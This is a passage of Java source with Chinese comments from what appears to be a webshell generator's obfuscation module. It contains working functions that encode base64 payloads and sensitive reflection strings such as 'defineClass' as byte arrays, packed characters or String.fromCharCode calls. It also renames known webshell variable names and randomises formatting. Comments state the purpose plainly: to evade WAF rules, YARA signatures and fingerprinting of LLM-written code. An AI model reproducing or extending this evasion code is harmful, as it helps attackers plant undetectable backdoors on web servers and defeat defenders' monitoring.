        Pattern p = Pattern.compile("\"([A-Za-z0-9+/=]{100,})\"");
        Matcher m = p.matcher(code);
        if (!m.find()) return code;

        String methodName = ClassNameGenerator.randomFieldName(new HashSet<String>());
        m.reset();
        StringBuffer sb = new StringBuffer();
        boolean changed = false;

        while (m.find()) {
            String payload = m.group(1);
            // 两两打包：(c[i] << 8) | c[i+1]，奇数长度末尾补 '\0'
            StringBuilder packed = new StringBuilder(methodName + "(\"");
            for (int i = 0; i < payload.length(); i += 2) {
                char hi = payload.charAt(i);
                char lo = (i + 1 < payload.length()) ? payload.charAt(i + 1) : '\0';
                packed.append((char) ((hi << 8) | (lo & 0xFF)));
            }
            // 传原始长度，helper 用来截掉奇数末尾的补位字节
            packed.append("\",").append(payload.length()).append(')');
            m.appendReplacement(sb, Matcher.quoteReplacement(packed.toString()));
            changed = true;
        }
        m.appendTail(sb);
        if (!changed) return code;
        code = sb.toString();

        // helper：逐 char 取高低字节还原，截到 n 个字节后构造字符串供 Base64 解码
        String helperDecl =
            "private static String " + methodName + "(String s,int n){"
            + "byte[] b=new byte[n];"
            + "int k=0;"
            + "for(int i=0;i<s.length()&&k<n;i++){"
            +   "char c=s.charAt(i);"
            +   "b[k++]=(byte)(c>>8);"
            +   "if(k<n)b[k++]=(byte)(c&0xFF);"
            + "}"
            + "return new String(b);}";

        // 打包字符含非 ASCII，需确保容器以 UTF-8 读取
        return injectHelperDecl(code, helperDecl, true);
    }

    // -----------------------------------------------------------------------
    // 字节数组编码（供 BYTE_ARRAY_ENCODE 步骤使用）
    // -----------------------------------------------------------------------

    /**
     * 将代码中的敏感字符串字面量替换为标准 JDK {@code new String(new byte[]{...})} 构造形式，
     * 消除静态字符串特征，且无需注入任何 helper 方法。
     * <p>
     * 例如 {@code "defineClass"} 替换为
     * {@code new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115})}。
     * <p>
     * 与 {@link #ghostBitsEncode} 相比：
     * <ul>
     *   <li>不依赖 CJK 字符（CJK 壳已有对应 WAF 规则）；</li>
     *   <li>不需要声明区注入（减少一个特征点）；</li>
     *   <li>{@code new String(new byte[]{})} 是 JDK 标准写法，出现在大量正常代码中，误报率高。</li>
     * </ul>
     * <p>
     * 与 {@link #splitStringLiterals} 和 {@link #ghostBitsEncode} 互斥：三者均作用于同一组敏感字面量，
     * 同时选中时后两者为空操作。
     *
     * @param code JSP/JSPX 代码
     * @return 字节数组编码后的代码
     */
    public static String byteArrayEncode(String code) {
        for (String literal : collectLiterals(code)) {
            String target = "\"" + literal + "\"";
            if (!code.contains(target)) continue;

            StringBuilder sb = new StringBuilder("new String(new byte[]{");
            for (int i = 0; i < literal.length(); i++) {
                if (i > 0) sb.append(',');
                sb.append((int) literal.charAt(i));
            }
            sb.append("})");
            code = code.replace(target, sb.toString());
        }
        return code;
    }

    // -----------------------------------------------------------------------
    // 标识符重命名（供 IDENTIFIER_RENAME 步骤使用）
    // -----------------------------------------------------------------------

    /**
     * 已知的 WebShell 常用变量名，这些名称常出现在静态签名库和 YARA 规则中。
     * 按长度降序排列，避免短名是长名子词时的替换干扰（如先替换 bytes，再替换 classBytes）。
     */
    private static final String[] KNOWN_SHELL_VARS = {
        "shellBytes", "classBytes", "payloadBytes", "byteCode",
        "classLoader", "parentLoader", "targetLoader",
        "defineClass", "loadClass",
        "theUnsafe", "unsafe",
        "clazz", "cls",
        "constructor",
        "runtime", "process",
        "method", "field",
        "loader"
    };

    /**
     * 将 JSP/JSPX 代码中 scriptlet 块里已知的 WebShell 特征变量名替换为随机字段名，
     * 消除静态签名库和 YARA 规则对固定变量名的匹配。
     * <p>
     * 重命名仅作用于 scriptlet/declaration 块内部（JSP 的 {@code <% %>} 和 {@code <%! %>}、
     * JSPX 的 {@code <![CDATA[...]]>}），不触碰 HTML 内容，避免意外替换 HTML 属性值。
     * <p>
     * 同一次调用内同一变量名始终映射到同一替换名，保证同名变量在多个 scriptlet 块间一致。
     * <p>
     * 注意：JSP 隐式对象（request、response、session 等）不在替换列表中，不会被改动。
     * 模板渲染阶段（TemplateRenderer）已通过 {@code {{VAR:name}}} 占位符完成大部分变量名随机化，
     * 本步骤作为补充层，专门处理可能残留的硬编码特征名。
     *
     * @param code JSP/JSPX 代码
     * @return 变量名已替换的代码
     */
    public static String renameIdentifiers(String code) {
        // 1. 构建「特征名 → 随机名」映射，只映射实际出现在代码中的变量名
        Set<String> used = new HashSet<String>();
        java.util.Map<String, String> mapping = new java.util.LinkedHashMap<String, String>();
        for (String v : KNOWN_SHELL_VARS) {
            if (Pattern.compile("\\b" + Pattern.quote(v) + "\\b").matcher(code).find()) {
                mapping.put(v, ClassNameGenerator.randomFieldName(used));
            }
        }
        if (mapping.isEmpty()) return code;

        // 按长度降序迭代，避免短名污染长名的替换（KNOWN_SHELL_VARS 已预排序，此处重排保险）
        java.util.List<java.util.Map.Entry<String, String>> entries =
                new java.util.ArrayList<java.util.Map.Entry<String, String>>(mapping.entrySet());
        entries.sort(new java.util.Comparator<java.util.Map.Entry<String, String>>() {
            public int compare(java.util.Map.Entry<String, String> a,
                               java.util.Map.Entry<String, String> b) {
                return b.getKey().length() - a.getKey().length();
            }
        });

        // 2. 根据格式选择替换策略
        if (code.contains("<jsp:scriptlet>") || code.contains("<jsp:declaration>")) {
            // JSPX：仅替换所有 <![CDATA[...]]> 块内内容
            Pattern cdataPattern = Pattern.compile("(<!\\[CDATA\\[)(.*?)(\\]\\]>)", Pattern.DOTALL);
            Matcher m = cdataPattern.matcher(code);
            StringBuffer sb = new StringBuffer();
            while (m.find()) {
                String cdata = applyMapping(m.group(2), entries);
                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + cdata + m.group(3)));
            }
            m.appendTail(sb);
            return sb.toString();
        } else {
            // JSP：分两轮分别处理 <% %> 和 <%! %> 块
            // 第一轮：执行 scriptlet 块 <% %>（排除 <%! <%@ <%=）
            Pattern scriptletPat = Pattern.compile("(<%(?![!@=]))(.*?)(%>)", Pattern.DOTALL);
            Matcher m = scriptletPat.matcher(code);
            StringBuffer sb = new StringBuffer();
            while (m.find()) {
                String content = applyMapping(m.group(2), entries);
                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + content + m.group(3)));
            }
            m.appendTail(sb);
            code = sb.toString();

            // 第二轮：声明块 <%! %>
            Pattern declPat = Pattern.compile("(<%!)(.*?)(%>)", Pattern.DOTALL);
            m = declPat.matcher(code);
            sb = new StringBuffer();
            while (m.find()) {
                String content = applyMapping(m.group(2), entries);
                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + content + m.group(3)));
            }
            m.appendTail(sb);
            return sb.toString();
        }
    }

    /** 对 content 依次应用 mapping 中的全词替换，返回替换后的字符串 */
    private static String applyMapping(String content,
            java.util.List<java.util.Map.Entry<String, String>> entries) {
        for (java.util.Map.Entry<String, String> e : entries) {
            content = content.replaceAll("\\b" + Pattern.quote(e.getKey()) + "\\b",
                    Matcher.quoteReplacement(e.getValue()));
        }
        return content;
    }

    /**
     * JS 版 Ghost Bits 编码：将 JS 代码中的敏感字符串字面量替换为
     * {@code String.fromCharCode(c1,c2,...)} 调用，消除静态字符串特征。
     * <p>
     * 例如 {@code "defineClass"} →
     * {@code String.fromCharCode(100,101,102,105,110,101,67,108,97,115)}
     * <p>
     * 适用于 ScriptEngine（Nashorn）JS 模板，{@code String.fromCharCode} 为标准 JS 内置函数，
     * 无需注入 helper 方法，运行时等价于原始字符串。
     * <p>
     * 目标字符串通过 {@link #collectLiterals(String)} 动态提取（FQCN 类名 + 反射 API 参数），
     * 与 JSP Ghost Bits 共享同一套敏感字面量识别逻辑。
     *
     * @param code JS 代码（模板占位符已完成替换）
     * @return Ghost Bits 编码后的代码
     */
    /**
     * 随机化 scriptlet 块内的缩进风格与空行节奏，打破 LLM 生成代码的统计指纹。
     *
     * <p>每次生成时随机选择缩进单元（2 空格 / 3 空格 / 4 空格 / tab），
     * 并以一定概率在语句间随机插入或删除空行，使输出的格式特征无规律可循。
     * 仅处理 {@code <% %>} 和 {@code <%! %>} scriptlet 块内容，不触碰 JSP 指令行和 HTML 部分。
     *
     * @param code 已渲染完占位符的 JSP/JSPX 代码
     * @return 格式随机化后的代码
     */
    public static String normalizeWhitespace(String code) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        // 每次运行随机选一种缩进单元，让输出格式特征无法固定
        String[] indentOptions = {"  ", "   ", "    ", "\t"};
        String indentUnit = indentOptions[rng.nextInt(indentOptions.length)];

        // 匹配 <%! ... %> 和 <% ... %>，DOTALL 使 . 匹配换行
        Pattern scriptletPat = Pattern.compile("(<%!?)(.*?)(%>)", Pattern.DOTALL);
        Matcher m = scriptletPat.matcher(code);
        StringBuffer sb = new StringBuffer();
        while (m.find()) {
            String open    = m.group(1);
            String content = m.group(2);
            String close   = m.group(3);
            String rewritten = reformatScriptletContent(content, indentUnit, rng);
            m.appendReplacement(sb, Matcher.quoteReplacement(open + rewritten + close));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    /**
     * 对 scriptlet 块内容重新排版：
     * <ul>
     *   <li>剥离原有缩进，按新的 {@code indentUnit} 重新应用（保留相对层级）</li>
     *   <li>随机以 20% 概率在非空行前插入额外空行（模拟不同编码风格）</li>
     *   <li>随机以 33% 概率删除原有空行（减少行数变化的统计规律）</li>
     * </ul>
     */
    private static String reformatScriptletContent(String content, String indentUnit,
                                                    ThreadLocalRandom rng) {
        String[] lines = content.split("\n", -1);
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < lines.length; i++) {
            String line    = lines[i];
            String trimmed = line.trim();

            // 空行：随机保留（2/3 概率）或丢弃
            if (trimmed.isEmpty()) {
                if (rng.nextInt(3) != 0) {
                    out.append('\n');
                }
                continue;
            }

            // 计算原始缩进深度（tab 按 4 空格计）
            int spaces = 0;
            for (int ci = 0; ci < line.length(); ci++) {
                char c = line.charAt(ci);
                if (c == ' ')       { spaces++; }
                else if (c == '\t') { spaces += 4; }
                else                { break; }
            }
            int level = spaces / 4;

            // 以 20% 概率在非空行前额外插入一个空行（仅当上一输出行不是空行时）
            if (i > 0 && !lines[i - 1].trim().isEmpty() && rng.nextInt(5) == 0) {
                out.append('\n');
            }

            // 用新的缩进单元重建缩进
            for (int l = 0; l < level; l++) {
                out.append(indentUnit);
            }
            out.append(trimmed).append('\n');
        }
        return out.toString();
    }

    public static String ghostBitsEncodeJs(String code) {
        for (String literal : collectLiterals(code)) {
            String target = "\"" + literal + "\"";
            if (!code.contains(target)) continue;

            StringBuilder sb = new StringBuilder("String.fromCharCode(");
            for (int i = 0; i < literal.length(); i++) {
                if (i > 0) sb.append(',');
                sb.append((int) literal.charAt(i));
            }
            sb.append(')');
            code = code.replace(target, sb.toString());
        }
        return code;
    }
}

